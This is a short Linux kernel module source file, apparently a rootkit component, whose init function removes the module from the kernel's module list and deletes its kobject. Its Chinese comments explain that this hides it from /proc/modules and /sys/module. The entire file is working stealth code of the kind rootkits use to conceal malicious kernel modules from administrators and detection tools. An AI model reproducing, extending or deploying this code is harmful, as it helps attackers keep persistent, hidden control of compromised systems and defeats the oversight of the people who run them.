#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mutex.h>

static DEFINE_MUTEX(module_mutex);

static int __init rootkit_init(void)
{
    printk("[module_hidder] loaded");
    mutex_lock(&module_mutex);
    // 摘除链表，/proc/modules 中不可见
    list_del_init(&THIS_MODULE->list);
    // 摘除kobj，/sys/modules/中不可见。
	kobject_del(&THIS_MODULE->mkobj.kobj);
    mutex_unlock(&module_mutex);
    return 0;
}

static void __exit rootkit_exit(void)
{
    printk("[module_hidder] exited");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");